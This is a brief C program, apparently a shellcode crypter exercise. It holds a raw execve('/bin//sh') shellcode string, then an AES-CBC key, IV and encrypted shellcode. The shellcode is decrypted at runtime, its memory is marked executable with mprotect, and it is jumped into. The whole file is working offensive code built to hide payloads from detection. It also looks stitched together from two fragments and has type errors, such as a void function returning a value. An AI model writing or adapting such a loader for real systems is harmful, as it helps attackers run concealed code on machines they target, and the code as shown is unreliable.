#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";


#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"

int i;
static void decrypt_and_run(void)
{
    // Generating Key:
    uint8_t key[] = { 0x12, 0xba, 0x43, 0xb6, 0xc7, 0x34, 0x7f, 0x97, 0xa4, 0xd7, 0xd7, 0x31, 0x6f, 0x96, 0x8c, 0x2c, 0x44, 0xed, 0xcd, 0xab, 0xeb, 0x1b, 0x93, 0xc2, 0xc2, 0xb6, 0xc6, 0x56, 0x4d, 0x28, 0xbc, 0x60, };

    // Generating IV:
    uint8_t iv[]  = { 0xe3, 0xff, 0x16, 0xaa, 0x33, 0x96, 0x42, 0xd8, 0x6d, 0x19, 0x09, 0xdc, 0xaf, 0x95, 0x09, 0xf4, };

    // Encrypted Shellcode:
    uint8_t shellcode[] = { 0x45, 0x62, 0xcb, 0xd4, 0x95, 0x1c, 0x5e, 0x7d, 0x84, 0x29, 0xcd, 0xb7, 0xab, 0xac, 0x64, 0x71, 0x80, 0x57, 0x0f, 0x54, 0x22, 0x38, 0x4d, 0xc1, 0x52, 0xf7, 0x87, 0x7c, 0xfe, 0xca, 0xe6, 0x92, };
                    
    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));


    // pass decrypted shellcode to function and execute
    int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
    int (*ret)() = (int(*)())shellcode;
    return ret();

}

int main(void)
{
    decrypt_and_run();
}